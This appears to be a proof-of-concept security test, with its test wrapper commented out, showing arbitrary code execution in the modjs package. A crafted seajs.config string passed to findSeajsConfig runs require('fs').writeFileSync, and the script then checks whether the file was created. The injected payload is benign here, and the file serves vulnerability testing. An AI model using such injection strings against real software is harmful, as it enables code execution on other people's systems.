// test("Arbitrary code execution in modjs", () => {
//   expect.assertions(2);
  const fs = require("fs");
  const sea = require("modjs/lib/utils/sea");
  const path = "./modjs";
  file_exist = fs.existsSync(path);
console.log("{ " + file_exist + ", " + false + " }");
  try {
    sea.findSeajsConfig(
      "seajs.config({a: require('fs').writeFileSync('./modjs', '')})"
    );
  } catch (error) {}
  file_exist = fs.existsSync(path);
console.log("{ " + file_exist + ", " + true + " }");
  fs.unlink(path, function (err) {});
// });
